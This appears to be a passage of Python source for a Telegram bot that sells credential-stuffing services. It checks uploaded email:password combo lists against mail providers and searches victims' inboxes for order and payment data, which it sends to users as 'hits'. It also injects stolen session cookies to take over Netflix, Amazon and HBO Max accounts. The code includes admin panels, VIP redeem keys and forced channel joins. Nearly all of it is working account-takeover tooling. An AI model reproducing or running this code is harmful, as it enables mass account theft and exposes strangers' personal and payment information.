            combos = data.get("total_combos_checked", 0)
            inbox_hits = data.get("inbox_hits", 0)
            entries.append(f"{medal} <code>{uid}</code> (@{uname})\n"
                          f"   📊 Scans: {scans} | ✅ Hits: {hits} | 📬 Inbox Hits: {inbox_hits}\n"
                          f"   📦 Combos: {combos}")

        global_s = get_global_stats()
        header = (f"🏆 <b>TOP USERS</b>\n\n"
                 f"📊 <b>Global:</b> {global_s['total_scans']} Scans | {global_s['total_hits']} Hits | "
                 f"{global_s['total_combos']} Combos\n"
                 f"👥 <b>Active Users:</b> {global_s['total_users']}\n\n")

        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel"))
        bot.edit_message_text(header + "\n\n".join(entries) + f"\n\n💎 {MY_SIGNATURE}",
                             call.message.chat.id, call.message.message_id,
                             parse_mode='HTML', reply_markup=markup)

    elif call.data.startswith("sorted_export_"):
        target_user_id = int(call.data.replace("sorted_export_", ""))
        if call.from_user.id != target_user_id and call.from_user.id != ADMIN_ID:
            bot.answer_callback_query(call.id, "❌ Access denied!", show_alert=True)
            return
        session = user_sessions.get(target_user_id, {})
        last_hits = session.get("last_hits_data", [])

        if not last_hits:
            bot.answer_callback_query(call.id, "❌ No hits data available!", show_alert=True)
        else:
            from collections import defaultdict
            service_groups = defaultdict(list)
            for hit in last_hits:
                for svc in hit.get('services', []):
                    service_groups[svc].append(hit)
                if not hit.get('services'):
                    service_groups['No Service'].append(hit)

            sorted_services = sorted(service_groups.keys())

            sorted_file_path = f"sorted_export_{target_user_id}.txt"
            with open(sorted_file_path, 'w', encoding='utf-8') as f:
                f.write(f"# Sorted Export by Service — {MY_SIGNATURE}\n")
                f.write(f"# Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Total Services Found: {len(sorted_services)}\n\n")

                for svc in sorted_services:
                    svc_hits = service_groups[svc]
                    f.write(f"{'='*40}\n")
                    f.write(f"📌 {svc} — {len(svc_hits)} hits\n")
                    f.write(f"{'='*40}\n")
                    for idx, h in enumerate(svc_hits, 1):
                        line_text = f"  #{idx} {h['email']}:{h['password']}"
                        if svc == "Shein" and h.get('shein_payment'):
                            clean_pay = h['shein_payment'].replace('<b>', '').replace('</b>', '').strip()
                            line_text += f"  | {clean_pay}"
                        f.write(line_text + "\n")
                    f.write("\n")

            try:
                with open(sorted_file_path, 'rb') as f:
                    file_bytes = f.read()
                send_large_document(call.message.chat.id, file_bytes,
                    os.path.basename(sorted_file_path),
                    caption=f"📂 <b>Sorted Export</b>\n\n"
                            f"Services: {len(sorted_services)}\n"
                            f"Total Hits: {len(last_hits)}\n\n"
                            f"💎 {MY_SIGNATURE}")
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ Export failed: {str(e)}", show_alert=True)

            if os.path.exists(sorted_file_path):
                os.remove(sorted_file_path)

            if "last_hits_data" in session:
                del session["last_hits_data"]

    elif call.data == "admin_maintenance":
        global maintenance_mode
        maintenance_mode = not maintenance_mode
        status = "🟢 ON" if maintenance_mode else "🔴 OFF"
        bot.edit_message_text(
            f"🔧 <b>MAINTENANCE MODE</b>\n\n"
            f"Status: <b>{status}</b>\n\n"
            f"{'⚠️ All scan features are now DISABLED for non-admin users.' if maintenance_mode else '✅ All features are now available to all users.'}",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML',
            reply_markup=types.InlineKeyboardMarkup().add(
                types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel")
            )
        )

    elif call.data == "admin_active_scans":
        if not active_scans:
            bot.edit_message_text(
                "🔍 <b>ACTIVE SCANS</b>\n\n"
                "❌ No active scans at the moment.\n\n"
                f"💎 {MY_SIGNATURE}",
                call.message.chat.id, call.message.message_id,
                parse_mode='HTML',
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel")))
        else:
            with _scan_lock:
                running = {uid: val for uid, val in active_scans.items() if val}
            if not running:
                bot.edit_message_text(
                    "🔍 <b>AKTIVE SCANS</b>\n\n"
                    "❌ No active scans at the moment.\n\n"
                    f"💎 {MY_SIGNATURE}",
                    call.message.chat.id, call.message.message_id,
                    parse_mode='HTML',
                    reply_markup=types.InlineKeyboardMarkup().add(
                        types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel")))
            else:
                lines = []
                markup = types.InlineKeyboardMarkup(row_width=1)
                for uid in running:
                    u = get_json_user(uid)
                    uname = u.get("username", "N/A") if u else "N/A"
                    lines.append(f"👤 <code>{uid}</code> (@{uname})")
                    markup.add(types.InlineKeyboardButton(
                        f"⏹ Stop {uid} (@{uname})", callback_data=f"admin_stop_{uid}"))
                markup.add(
                    types.InlineKeyboardButton("⏹ ALLE STOPPEN", callback_data="admin_stop_all"),
                    types.InlineKeyboardButton("🔄 Aktualisieren", callback_data="admin_active_scans"),
                    types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel"))
                bot.edit_message_text(
                    f"🔍 <b>AKTIVE SCANS ({len(running)})</b>\n\n" +
                    "\n".join(lines) +
                    f"\n\n💎 {MY_SIGNATURE}",
                    call.message.chat.id, call.message.message_id,
                    parse_mode='HTML', reply_markup=markup)

    elif call.data.startswith("admin_stop_"):
        if call.data == "admin_stop_all":
            stopped_count = 0
            for uid in list(active_scans.keys()):
                if active_scans.get(uid):
                    active_scans[uid] = False
                    stopped_count += 1
            bot.answer_callback_query(call.id, f"⏹ {stopped_count} Scans gestoppt!", show_alert=True)
            markup = types.InlineKeyboardMarkup()
            markup.add(
                types.InlineKeyboardButton("🔄 Aktualisieren", callback_data="admin_active_scans"),
                types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel"))
            bot.edit_message_text(
                f"⏹ <b>ALLE SCANS STOPPED</b>\n\n"
                f"✅ {stopped_count} Scans wurden beendet.\n\n"
                f"💎 {MY_SIGNATURE}",
                call.message.chat.id, call.message.message_id,
                parse_mode='HTML', reply_markup=markup)
        else:
            target_uid = int(call.data.replace("admin_stop_", ""))
            if active_scans.get(target_uid):
                active_scans[target_uid] = False
                u = get_json_user(target_uid)
                uname = u.get("username", "N/A") if u else "N/A"
                bot.answer_callback_query(call.id, f"⏹ Scan von @{uname} gestoppt!", show_alert=True)
                try:
                    bot.send_message(target_uid,
                        f"⏹ <b>Dein Scan wurde vom Admin gestoppt.</b>\n\n💎 {MY_SIGNATURE}",
                        parse_mode='HTML')
                except:
                    pass
            else:
                bot.answer_callback_query(call.id, "❌ No active scan found.", show_alert=True)
            markup = types.InlineKeyboardMarkup()
            markup.add(
                types.InlineKeyboardButton("🔄 Aktualisieren", callback_data="admin_active_scans"),
                types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel"))
            bot.edit_message_text(
                f"⏹ <b>Scan gestoppt</b>\n\n"
                f"User: <code>{target_uid}</code>\n\n"
                f"💎 {MY_SIGNATURE}",
                call.message.chat.id, call.message.message_id,
                parse_mode='HTML', reply_markup=markup)

    elif call.data == "admin_force_join" or call.data.startswith("admin_fj_"):
        enabled = _fj_config.get("enabled", False)
        channels = _fj_config.get("channels", [])

        def _fj_ch_list_text(chs):
            if not chs:
                return "  <i>None set</i>"
            lines = []
            for c in chs:
                if isinstance(c, dict):
                    lnk = c.get("link")
                    disp = c.get("display", "?")
                    lines.append(f"  • {disp}" + (f" — <a href='{lnk}'>link</a>" if lnk else " (no link)"))
                else:
                    lines.append(f"  • <code>{c}</code>")
            return "\n".join(lines)

        if call.data == "admin_fj_toggle":
            _fj_config["enabled"] = not enabled
            _save_fj_config(_fj_config)
            enabled = _fj_config["enabled"]
            bot.answer_callback_query(call.id, f"✅ Force Join {'ENABLED' if enabled else 'DISABLED'}", show_alert=False)

        elif call.data.startswith("admin_fj_remove_"):
            idx_str = call.data.replace("admin_fj_remove_", "")
            try:
                idx = int(idx_str)
                removed = _fj_config["channels"].pop(idx)
                _save_fj_config(_fj_config)
                channels = _fj_config["channels"]
                disp = removed.get("display", str(removed)) if isinstance(removed, dict) else str(removed)
                bot.answer_callback_query(call.id, f"✅ Removed {disp}", show_alert=False)
            except Exception:
                bot.answer_callback_query(call.id, "❌ Could not remove", show_alert=False)

        elif call.data == "admin_fj_add":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(call.message.chat.id,
                "📢 <b>Add Force Join Channel</b>\n\n"
                "Send the channel in <b>one</b> of these formats:\n\n"
                "① <code>@username</code> — public channel\n"
                "② <code>https://t.me/username</code> — public link\n"
                "③ <code>-100XXXXXXXXX https://t.me/+HASH</code>\n"
                "   ↳ private channel: ID + invite link\n"
                "④ <code>-100XXXXXXXXX</code> — ID only (no join button)\n\n"
                "⚠️ For membership checks the bot must be <b>admin</b> in the channel!",
                parse_mode='HTML')
            def _wait_fj_channel(m):
                if m.from_user.id != ADMIN_ID:
                    return
                parsed = _parse_fj_channel_input(m.text or "")
                if parsed is None:
                    try:
                        bot.send_message(m.chat.id,
                            "❌ <b>Invalid format.</b>\n\n"
                            "For private channels use: <code>-100XXXXXXXXX https://t.me/+invite</code>\n"
                            "For public channels use: <code>@username</code>",
                            parse_mode='HTML')
                    except:
                        pass
                    return
                existing_ids = [
                    (c.get("id") if isinstance(c, dict) else c)
                    for c in _fj_config.get("channels", [])
                ]
                if parsed["id"] not in existing_ids:
                    _fj_config.setdefault("channels", []).append(parsed)
                    _save_fj_config(_fj_config)
                link_info = f"\n🔗 Join link: {parsed['link']}" if parsed.get("link") else "\n⚠️ No join link stored — users will see the channel ID only."
                try:
                    bot.send_message(m.chat.id,
                        f"✅ <b>Channel added!</b>\n\n"
                        f"📌 Display: <b>{parsed['display']}</b>"
                        f"{link_info}\n\n"
                        f"⚠️ Make sure the bot is an <b>admin</b> in that channel.",
                        parse_mode='HTML')
                except:
                    pass
            bot.register_next_step_handler(msg, _wait_fj_channel)
            return

        channels = _fj_config.get("channels", [])
        ch_list = _fj_ch_list_text(channels)
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton(
                f"{'🟢 Disable Force Join' if _fj_config.get('enabled') else '🔴 Enable Force Join'}",
                callback_data="admin_fj_toggle"
            ),
            types.InlineKeyboardButton("➕ Add Channel", callback_data="admin_fj_add"),
        )
        for idx, ch in enumerate(channels):
            disp = ch.get("display", str(ch)) if isinstance(ch, dict) else str(ch)
            markup.add(types.InlineKeyboardButton(f"🗑 Remove {disp}", callback_data=f"admin_fj_remove_{idx}"))
        markup.add(types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel"))

        try:
            bot.edit_message_text(
                f"📢 <b>FORCE JOIN SETTINGS</b>\n\n"
                f"Status: {'🟢 <b>ENABLED</b>' if _fj_config.get('enabled') else '🔴 <b>DISABLED</b>'}\n\n"
                f"Required Channels:\n{ch_list}\n\n"
                f"⚠️ Bot must be <b>admin</b> in each channel!\n\n"
                f"💎 {MY_SIGNATURE}",
                call.message.chat.id, call.message.message_id,
                parse_mode='HTML', reply_markup=markup,
                disable_web_page_preview=True)
        except:
            pass

    elif call.data == "admin_groups":
        groups = load_allowed_groups()
        if groups:
            group_list = "\n".join([f"• <code>{g}</code>" for g in groups])
        else:
            group_list = "No groups activated"
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("➕ Add Group", callback_data="group_add"),
            types.InlineKeyboardButton("➖ Remove Group", callback_data="group_remove"),
            types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel")
        )
        bot.edit_message_text(
            f"👥 <b>GROUP MANAGEMENT</b>\n\n"
            f"🆓 All features are free in groups!\n"
            f"Add the bot to a group and send /start as admin.\n\n"
            f"📋 <b>Active Groups ({len(groups)}):</b>\n{group_list}\n\n"
            f"💎 {MY_SIGNATURE}",
            call.message.chat.id, call.message.message_id,
            parse_mode='HTML', reply_markup=markup
        )

    elif call.data == "group_add":
        user_sessions[user_id] = {"mode": "admin_group_add"}
        bot.edit_message_text(
            "➕ <b>ADD GROUP</b>\n\n"
            "Send the group chat ID (negative number).\n\n"
            "💡 <b>Tip:</b> Just add the bot to the group and send /start there!\n"
            "The group will be activated automatically.",
            call.message.chat.id, call.message.message_id,
            parse_mode='HTML'
        )

    elif call.data == "group_remove":
        groups = load_allowed_groups()
        if not groups:
            bot.edit_message_text("❌ No groups to remove.",
                call.message.chat.id, call.message.message_id,
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("◀️ Back", callback_data="admin_groups")))
            return
        markup = types.InlineKeyboardMarkup(row_width=1)
        for g in groups:
            markup.add(types.InlineKeyboardButton(f"❌ {g}", callback_data=f"group_del_{g}"))
        markup.add(types.InlineKeyboardButton("◀️ Back", callback_data="admin_groups"))
        bot.edit_message_text("➖ <b>Which group to remove?</b>",
            call.message.chat.id, call.message.message_id,
            parse_mode='HTML', reply_markup=markup)

    elif call.data.startswith("group_del_"):
        gid = int(call.data.replace("group_del_", ""))
        remove_allowed_group(gid)
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("◀️ Back", callback_data="admin_groups"))
        bot.edit_message_text(
            f"✅ Gruppe <code>{gid}</code> wurde entfernt!",
            call.message.chat.id, call.message.message_id,
            parse_mode='HTML', reply_markup=markup)

    elif call.data == "admin_user_logs":
        all_logs = get_all_user_logs()
        if not all_logs:
            bot.edit_message_text("📋 Noch keine User-Logs vorhanden.",
                call.message.chat.id, call.message.message_id,
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel")))
            return
        entries = []
        sorted_logs = sorted(all_logs.items(),
            key=lambda x: x[1]["actions"][-1]["time"] if x[1]["actions"] else "", reverse=True)
        for uid, data in sorted_logs[:15]:
            uname = data.get("username", "N/A")
            devices = ", ".join(data.get("devices", [])[:3]) or "N/A"
            last_action = data["actions"][-1] if data["actions"] else {}
            last_time = last_action.get("time", "N/A")
            last_act = last_action.get("action", "N/A")[:30]
            action_count = len(data.get("actions", []))
            entries.append(
                f"👤 <code>{uid}</code> (@{uname})\n"
                f"   📱 {devices}\n"
                f"   🕐 Letzte: {last_time}\n"
                f"   📊 {action_count} Aktionen | Letzte: {last_act}")
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("🔍 User-Log suchen", callback_data="search_user_log"),
            types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel")
        )
        text_out = "📋 <b>USER ACTIVITY LOGS</b>\n\n" + "\n\n".join(entries) + f"\n\n💎 {MY_SIGNATURE}"
        if len(text_out) > 4000:
            text_out = text_out[:3950] + "\n\n... (gekürzt)"
        bot.edit_message_text(text_out,
            call.message.chat.id, call.message.message_id,
            parse_mode='HTML', reply_markup=markup)

    elif call.data == "search_user_log":
        user_sessions[user_id] = {"mode": "admin_search_log"}
        bot.edit_message_text(
            "🔍 <b>USER-LOG SUCHEN</b>\n\n"
            "Sende die User-ID um deren Log zu sehen:",
            call.message.chat.id, call.message.message_id,
            parse_mode='HTML')

    elif call.data == "admin_generate_key":
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn1 = types.InlineKeyboardButton("⏱ 1 Stunde", callback_data="keygen_1h")
        btn2 = types.InlineKeyboardButton("📅 1 Tag", callback_data="keygen_1d")
        btn3 = types.InlineKeyboardButton("📆 1 Woche", callback_data="keygen_1w")
        btn4 = types.InlineKeyboardButton("🗓 1 Monat", callback_data="keygen_1m")
        btn5 = types.InlineKeyboardButton("♾️ Forever", callback_data="keygen_forever")
        btn_back = types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel")
        markup.add(btn1, btn2, btn3, btn4, btn5, btn_back)
        bot.edit_message_text(
            "🔑 <b>KEY GENERIEREN</b>\n\n"
            "How long should the key be valid?",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML',
            reply_markup=markup
        )

    elif call.data.startswith("keygen_"):
        duration = call.data.replace("keygen_", "")
        duration_labels = {
            "1h": "1 Stunde",
            "1d": "1 Tag",
            "1w": "1 Woche",
            "1m": "1 Monat",
            "forever": "Forever"
        }
        generated_key = generate_redeem_code(vip_duration=duration)
        label = duration_labels.get(duration, duration)
        markup = types.InlineKeyboardMarkup(row_width=1)
        btn_back = types.InlineKeyboardButton("◀️ Back", callback_data="admin_generate_key")
        btn_panel = types.InlineKeyboardButton("🏠 Admin Panel", callback_data="admin_panel")
        markup.add(btn_back, btn_panel)
        bot.edit_message_text(
            f"✅ <b>KEY GENERATED!</b>\n\n"
            f"🔑 Key: <code>{generated_key}</code>\n"
            f"⏱ Valid: <b>{label}</b>\n\n"
            f"Send this key to the user.\n"
            f"They can redeem it with /redeem.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML',
            reply_markup=markup
        )

    elif call.data == "view_free_users":
        free_users = get_free_users()

        if not free_users:
            user_text = "📋 <b>FREE USERS</b>\n\n❌ No free users"
        else:
            user_text = f"📋 <b>FREE USERS</b> ({len(free_users)} total)\n\n"
            for i, user in enumerate(free_users[:20], 1):  # Show first 20
                user_text += f"{i}. <code>{user[0]}</code> @{user[1] or 'N/A'}\n"

            if len(free_users) > 20:
                user_text += f"\n... and {len(free_users) - 20} more"

        bot.edit_message_text(user_text,
                            call.message.chat.id,
                            call.message.message_id,
                            parse_mode='HTML',
                            reply_markup=admin_panel_keyboard())

    elif call.data == "view_vip_users":
        vips = get_all_vips()

        if not vips:
            vip_text = "📋 <b>VIP USERS</b>\n\n❌ No VIP users"
        else:
            vip_text = f"📋 <b>VIP USERS</b> ({len(vips)} total)\n\n"
            for i, vip in enumerate(vips, 1):
                vip_text += f"{i}. <code>{vip[0]}</code> @{vip[1] or 'N/A'}\n"
                vip_text += f"   Until: {vip[2]}\n\n"

        bot.edit_message_text(vip_text,
                            call.message.chat.id,
                            call.message.message_id,
                            parse_mode='HTML',
                            reply_markup=admin_panel_keyboard())

    elif call.data == "fj_check":
        missing_channels = check_force_join(user_id)
        if missing_channels:
            ch_lines = "\n".join([f"• {c.get('display', c) if isinstance(c, dict) else c}" for c in missing_channels])
            try:
                bot.edit_message_text(
                    f"❌ <b>Still not joined!</b>\n\n"
                    f"Please join the following channel(s):\n\n"
                    f"{ch_lines}"
                    f"\n\nThen press <b>✅ I Joined</b> below.\n\n💎 {MY_SIGNATURE}",
                    call.message.chat.id, call.message.message_id,
                    parse_mode='HTML', reply_markup=_fj_join_markup(missing_channels))
            except:
                pass
        else:
            bot.answer_callback_query(call.id, "✅ Verified! You can now use the bot.", show_alert=True)
            try:
                bot.delete_message(call.message.chat.id, call.message.message_id)
            except:
                pass

    elif call.data == "fj_no_link":
        bot.answer_callback_query(call.id, "Search for this channel manually in Telegram.", show_alert=True)

    elif call.data == "back_main":
        bot.delete_message(call.message.chat.id, call.message.message_id)

    # VIP Duration
    elif call.data.startswith("vip_duration_"):
        duration = call.data.replace("vip_duration_", "")
        session = user_sessions.get(user_id, {})
        target_user_id = session.get("vip_target_id")

        if target_user_id:
            target_username = session.get("vip_target_username", "Unknown")
            add_vip(target_user_id, target_username, duration)

            duration_text = {
                "1h": "1 Stunde",
                "1d": "1 Tag",
                "1w": "1 Woche",
                "1m": "1 Monat",
                "forever": "Forever"
            }

            bot.edit_message_text(
                f"✅ <b>VIP hinzugefügt!</b>\n\n"
                f"👤 User: <code>{target_user_id}</code> (@{target_username})\n"
                f"⏱ Dauer: {duration_text.get(duration, 'Unknown')}",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='HTML',
                reply_markup=admin_panel_keyboard()
            )

            try:
                bot.send_message(target_user_id,
                               f"🎉 <b>Glückwunsch!</b>\n\n"
                               f"Du bist jetzt VIP!\n"
                               f"⏱ Dauer: {duration_text.get(duration, 'Unknown')}\n\n"
                               f"💎 {MY_SIGNATURE}",
                               parse_mode='HTML',
                               reply_markup=main_menu_keyboard(target_user_id))
            except:
                pass

            user_sessions.pop(user_id, None)



# Handle File Uploads
@bot.message_handler(content_types=['document'])
def handle_document(message):
    user_id = message.from_user.id

    if is_group_chat(message) and not is_allowed_group(message.chat.id):
        return

    username = message.from_user.username or "unknown"
    log_user_activity(user_id, username, "document_upload", message)

    if is_banned(user_id):
        bot.send_message(message.chat.id,
                        f"❌ You are banned!",
                        parse_mode='HTML')
        return

    # ── Force Join Channel Check ───────────────────────────────────────────
    _doc_in_free_group = is_group_chat(message) and is_allowed_group(message.chat.id)
    if _fj_config.get("enabled") and user_id != ADMIN_ID and not _doc_in_free_group:
        _doc_missing = check_force_join(user_id)
        if _doc_missing:
            ch_lines = "\n".join([f"• {c.get('display', c) if isinstance(c, dict) else c}" for c in _doc_missing])
            try:
                bot.send_message(message.chat.id,
                    f"⚠️ <b>JOIN REQUIRED</b>\n\nJoin these channel(s) to use the bot:\n"
                    f"{ch_lines}\n\n💎 {MY_SIGNATURE}",
                    parse_mode='HTML', reply_markup=_fj_join_markup(_doc_missing))
            except:
                pass
            return

    if maintenance_mode and user_id != ADMIN_ID:
        bot.send_message(message.chat.id,
            "🔧 <b>MAINTENANCE MODE</b>\n\n"
            "The bot is currently under maintenance.\n"
            "Please try again later!\n\n"
            f"💎 {MY_SIGNATURE}",
            parse_mode='HTML')
        return

    # ── COOKIE LOGIN FILE UPLOAD ─────────────────────────────────
    doc_session = user_sessions.get(user_id, {})

    if doc_session.get("mode") == "cookie_login" and doc_session.get("step") == "waiting_cookie":
        svc_key = doc_session.get("service", "netflix")
        svc_names = {"netflix": "Netflix", "amazon": "Amazon", "hbomax": "HBO Max"}
        svc_emojis = {"netflix": "🎬", "amazon": "📦", "hbomax": "🎬"}
        svc_name = svc_names.get(svc_key, svc_key.title())
        svc_emoji = svc_emojis.get(svc_key, "🍪")
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded = bot.download_file(file_info.file_path)
            raw_cookie = downloaded.decode('utf-8', errors='ignore').strip()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Failed to download file: {e}")
            return
        cookies_list = _parse_cookies(raw_cookie)
        if not cookies_list:
            bot.send_message(message.chat.id,
                "❌ Could not parse cookies from file. Please send a valid cookie file "
                "(Netscape txt, JSON array, or name=value format).",
                parse_mode='HTML')
            return
        # ── Netflix: extract nftoken for direct browser login ──
        if svc_key == "netflix":
            nf_url = _extract_netflix_nftoken(cookies_list)
            if nf_url:
                markup = types.InlineKeyboardMarkup(row_width=2)
                markup.add(
                    types.InlineKeyboardButton("💻 PC Login", url=nf_url),
                    types.InlineKeyboardButton("📱 Phone Login", url=nf_url),
                )
                bot.send_message(
                    message.chat.id,
                    f"{svc_emoji} <b>{svc_name} Direct Login Ready</b>\n\n"
                    f"🍪 <b>Cookies parsed:</b> {len(cookies_list)}\n"
                    f"🔑 <b>nftoken extracted</b>\n\n"
                    "Tap the button \u2014 it opens in your <b>browser</b> and logs you in instantly.\n"
                    "(No app, no console, no steps needed)",
                    parse_mode='HTML',
                    reply_markup=markup
                )
                user_sessions.pop(user_id, None)
                return
        # ── Amazon / HBO Max (and Netflix fallback): bookmarklet page ──
        token = uuid.uuid4().hex
        _save_cookie_session(token, svc_key, cookies_list)
        pc_url = f"{_BOT_WEB_BASE}/cl/{token}/pc"
        phone_url = f"{_BOT_WEB_BASE}/cl/{token}/phone"
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("💻 PC Login", url=pc_url),
            types.InlineKeyboardButton("📱 Phone Login", url=phone_url),
        )
        bot.send_message(
            message.chat.id,
            f"{svc_emoji} <b>{svc_name} Cookie Login Ready</b>\n\n"
            f"🍪 <b>Cookies loaded:</b> {len(cookies_list)}\n\n"
            "Click a button to open the login page.\n"
            "The page will auto-inject cookies in your browser.",
            parse_mode='HTML',
            reply_markup=markup
        )
        user_sessions.pop(user_id, None)
        return

    # ── INBOX CHECKER MODE ──────────────────────────────────────

    if doc_session.get("mode") in ("inbox_single", "inbox_multi") and doc_session.get("step") == "waiting_combo":
        services = doc_session.get("services", [])
        try:
            downloaded_file = _download_combo(message)
            if downloaded_file is None:
                return
            raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()

            new_combos = []
            for line in raw_lines:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                parts = line.split(':', 1)
                email_addr, password = parts[0].strip(), parts[1].strip()
                if password and '@' in email_addr and '.' in email_addr.split('@')[-1]:
                    new_combos.append((email_addr, password))

            if not new_combos:
                bot.send_message(message.chat.id, "❌ No valid combo lines found in this file.")
                return

            # ── Multi-part accumulation ─────────────────────────────────
            existing = user_sessions[user_id].get("accumulated_combos", [])
            user_sessions[user_id]["accumulated_combos"] = existing + new_combos
            total_acc = len(user_sessions[user_id]["accumulated_combos"])
            part_num  = user_sessions[user_id].get("part_count", 0) + 1
            user_sessions[user_id]["part_count"] = part_num

            services_display = ", ".join(services)

            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(
                f"🚀 Start Scan ({total_acc:,} lines)",
                callback_data=f"mp_start_{user_id}"
            ))
            kb.add(types.InlineKeyboardButton(
                "🗑 Clear & Cancel",
                callback_data=f"mp_cancel_{user_id}"
            ))

            bot.send_message(
                message.chat.id,
                f"📥 <b>Part {part_num} received!</b>\n\n"
                f"✅ <b>{len(new_combos):,}</b> valid lines in this part\n"
                f"📊 <b>{total_acc:,}</b> total lines accumulated\n"
                f"📬 Services: <b>{services_display}</b>\n\n"
                f"Send <b>more parts</b> or press <b>Start Scan</b> when ready.\n"
                f"💡 Split large combos with: <code>split -b 15m combo.txt part_</code>",
                parse_mode='HTML',
                reply_markup=kb
            )
            return

        except Exception as e:
            try:
                bot.send_message(message.chat.id, f"❌ Error reading file: {str(e)}")
            except:
                pass
            return



    generic_service_modes = {svc["mode"]: key for key, svc in INBOX_SERVICES.items()}
    if doc_session.get("mode") in generic_service_modes and doc_session.get("step") == "waiting_combo":
        service_key = generic_service_modes[doc_session["mode"]]
        run_generic_inbox_check(message, user_id, service_key)
        return

    # ── RYD INBOXEN MODE ────────────────────────────────────────
    if doc_session.get("mode") == "inbox_ryd" and doc_session.get("step") == "waiting_combo":
        try:
            downloaded_file = _download_combo(message)
            if downloaded_file is None:
                return
            raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()

            combos = []
            for line in raw_lines:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                parts = line.split(':', 1)
                email_addr, password = parts[0].strip(), parts[1].strip()
                if password and '@' in email_addr and '.' in email_addr.split('@')[-1]:
                    combos.append((email_addr, password))

            total = len(combos)
            if total == 0:
                bot.send_message(message.chat.id, "❌ No valid lines found.")
                user_sessions.pop(user_id, None)
                return

            if not start_scan(user_id):
                bot.send_message(message.chat.id, "⚠️ Du hast bereits einen aktiven Scan!", parse_mode='HTML')
                return

            progress_msg = bot.send_message(
                message.chat.id,
                f"🚗 <b>RYD Inbox Scan Started!</b>\n\n"
                f"📬 Sender: <code>noreply@ryd.one</code>\n"
                f"📥 Accounts: <b>{total}</b>\n\n"
                f"⏳ Please wait...",
                parse_mode='HTML',
                reply_markup=stop_scan_keyboard(user_id)
            )

            hits = []
            bads = []
            no_inbox = []
            errors_list = []
            checked = [0]
            lock = threading.Lock()

            def ryd_check_one(combo):
                email_addr, password = combo
                if not active_scans.get(user_id, False):
                    return
                try:
                    result, provider = check_account_auto(email_addr, password)
                    if result.get("status") == "RETRY":
                        result, provider = check_account_auto(email_addr, password)

                    status = result.get("status", "RETRY")

                    if status == "BAD":
                        with lock:
                            checked[0] += 1
                            bads.append(f"{email_addr}:{password}")
                        return

                    if status != "HIT":
                        with lock:
                            checked[0] += 1
                            errors_list.append(f"{email_addr}:{password} | {status}")
                        return

                    found = False
                    orders = []
                    payments = []

                    if provider == "tonline":
                        found, fetched = TOnlineChecker.search_and_fetch(email_addr, password, "noreply@ryd.one", max_count=5)
                        if found and fetched:
                            orders, payments = extract_ryd_data(fetched)
                    else:
                        token = result.get("token", "")
                        cid = result.get("cid", "")
                        email_texts = _hotmail_search_and_fetch(token, cid, 'from:"noreply@ryd.one"', 5)
                        if email_texts:
                            found = True
                            orders, payments = extract_ryd_data(email_texts)

                    with lock:
                        checked[0] += 1
                        if found:
                            order_str = ", ".join(orders) if orders else "None"
                            pay_str = " | ".join(payments) if payments else "None"
                            hits.append(f"{email_addr}:{password} | RYD ✅ | Orders: {order_str} | Payment: {pay_str}")
                            hit_num = len(hits)
                        else:
                            no_inbox.append(f"{email_addr}:{password}")

                    if found:
                        try:
                            hit_msg = (
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"🚗 <b>RYD HIT #{hit_num}</b>\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                                f"📧 Email: <code>{email_addr}</code>\n"
                                f"🔑 Password: <code>{password}</code>\n\n"
                                f"🚗 <b>App:</b> RYD\n"
                                f"📦 <b>Orders:</b> {order_str}\n"
                                f"💳 <b>Payment Method:</b> {pay_str}\n\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"💎 {MY_SIGNATURE}"
                            )
                            ryd_is_group = is_allowed_group(message.chat.id) and message.chat.id != user_id
                            send_target = user_id if ryd_is_group else message.chat.id
                            bot.send_message(send_target, hit_msg, parse_mode='HTML')
                        except Exception:
                            pass
                except Exception as e:
                    print(f"[RYD] Error checking {email_addr}: {e}")
                    with lock:
                        checked[0] += 1
                        errors_list.append(f"{email_addr}:{password} | ERROR")

            def ryd_progress_updater():
                last = -1
                while checked[0] < total and active_scans.get(user_id, False):
                    if checked[0] != last:
                        last = checked[0]
                        try:
                            bot.edit_message_text(
                                f"🚗 <b>RYD Check Running...</b>\n\n"
                                f"📊 Progress: <b>{checked[0]}/{total}</b>\n"
                                f"✅ Hits: <b>{len(hits)}</b> | ❌ Bad: <b>{len(bads)}</b> | 📭 No Match: <b>{len(no_inbox)}</b>",
                                message.chat.id,
